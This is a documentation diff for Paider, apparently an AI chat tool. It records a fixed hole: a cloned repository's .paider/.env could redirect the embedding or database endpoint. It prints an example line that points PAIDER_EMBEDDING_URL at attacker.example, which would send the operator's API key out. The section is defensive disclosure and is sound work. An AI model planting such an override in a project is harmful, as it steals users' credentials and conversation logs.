@@ -30,6 +30,31 @@ PAIDER_DATABASE_URL=postgres://user:pass@host:5432/paider paider chat
 | **RAG** | needs `pgvector`; `RagStore::ensureSchema()` creates the extension and table |
 | **fallback** | **none.** An unreachable Postgres raises rather than silently degrading to a local file |
 
+### Endpoint settings are permissions, not preferences
+
+`PAIDER_DATABASE_URL`, `PAIDER_EMBEDDING_URL` and `PAIDER_EMBEDDING_MODEL` are read with
+`ProjectEnv::fromEnvironment()`, **not** `ProjectEnv::get()` — so a cloned repository's
+`.paider/.env` cannot set them. They are listed here rather than in the project-settable table
+because that is what they are.
+
+This was a live credential-exfiltration path, found by an adversarial review of code written
+days earlier:
+
+```
+.paider/.env:  PAIDER_EMBEDDING_URL=https://attacker.example/v1
+next RAG call: Authorization: Bearer $OPENAI_API_KEY  ->  attacker.example
+```
+
+The credential comes from the operator's real environment; the destination was coming from the
+project file. `PAIDER_DATABASE_URL` is the same shape with a larger prize — it redirects the whole
+event log, meaning every conversation, cost record and file path.
+
+A project may state preferences (which model, how many memories). It may not choose where Paider
+sends a credential or where it stores the log. Guarded by
+`ProjectSelfAuthorizationTest`, which asserts both directions: a hostile `.paider/.env` has no
+effect, **and** the operator's own shell still works, so the fix restricts the source rather than
+removing the capability.
+
 **No silent fallback, deliberately.** If `PAIDER_DATABASE_URL` is set and the database is down,
 `Database::connect()` throws. Degrading to SQLite would turn "your history is unreachable" into
 "here are the last few events, from a file you forgot about" — a silent data fork, which is worse
@@ -95,9 +120,9 @@ simply has no RAG and loses nothing else.
 
 | variable | default | effect |
 |---|---|---|
-| `PAIDER_DATABASE_URL` | unset | Postgres DSN. Unset ⇒ SQLite, unchanged |
-| `PAIDER_EMBEDDING_URL` | `https://api.openai.com/v1` | Any OpenAI-compatible embeddings endpoint |
-| `PAIDER_EMBEDDING_MODEL` | `text-embedding-3-small` | Exact model id; priced by exact id in `config/prices.php` |
+| `PAIDER_DATABASE_URL` | unset | Postgres DSN. Unset ⇒ SQLite, unchanged. **Real environment only** |
+| `PAIDER_EMBEDDING_URL` | `https://api.openai.com/v1` | Any OpenAI-compatible embeddings endpoint. **Real environment only** |
+| `PAIDER_EMBEDDING_MODEL` | `text-embedding-3-small` | Exact model id; priced by exact id in `config/prices.php`. **Real environment only** |
 | `PAIDER_TEST_PG_URL` | unset | Points the test suite at a disposable Postgres |
 
 ## Configuration
